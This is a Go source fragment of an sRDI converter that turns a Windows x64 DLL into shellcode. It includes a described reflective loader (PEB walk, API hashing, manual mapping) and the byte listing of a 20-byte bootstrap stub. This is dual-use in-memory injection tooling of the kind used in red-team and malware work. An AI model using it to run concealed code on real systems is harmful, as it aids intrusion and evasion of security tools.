// srdi.go — sRDI (shellcode Reflective DLL Injection) converter.
//
// Converts a Windows x64 PE DLL into position-independent shellcode by
// prepending a reflective loader stub.
//
// Shellcode layout:
//   [bootstrap 20 bytes] [loader 880 bytes] [raw DLL bytes]
//
// Bootstrap: self-locates via call/pop, sets RCX = DLL address,
// calls the reflective loader, then returns to the caller.
//
// Loader: PEB walk → kernel32 → ROR-13 hash resolve GetProcAddress,
// LoadLibraryA, VirtualAlloc → allocate, copy sections, relocate,
// resolve imports, call DllMain(DLL_PROCESS_ATTACH).
//
// x64 Windows only.

const (
	srdiBootstrapSize = 20
	srdiLoaderSize    = 880
	srdiCodeSize      = srdiBootstrapSize + srdiLoaderSize // 900
)

// srdiBootstrap — 20-byte x64 bootstrap stub.
//
//	E8 00 00 00 00       call $+5           ; push RIP
//	58                   pop  rax           ; rax = addr of this pop (offset 5)
//	48 8D 88 xx xx xx xx lea  rcx,[rax+off] ; rcx = DLL address (offset 900-5 = 895)
//	48 83 C0 0F          add  rax, 15       ; rax = loader start (offset 20)
//	FF D0                call rax           ; reflective_loader(dll)
//	C3                   ret
var srdiBootstrap = [srdiBootstrapSize]byte{
	0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
	0x58,                                     // pop rax
	0x48, 0x8D, 0x88, 0x00, 0x00, 0x00, 0x00, // lea rcx, [rax + PATCH] (patched below)
	0x48, 0x83, 0xC0, 0x0F, // add rax, 15
	0xFF, 0xD0, // call rax
	0xC3, // ret
}

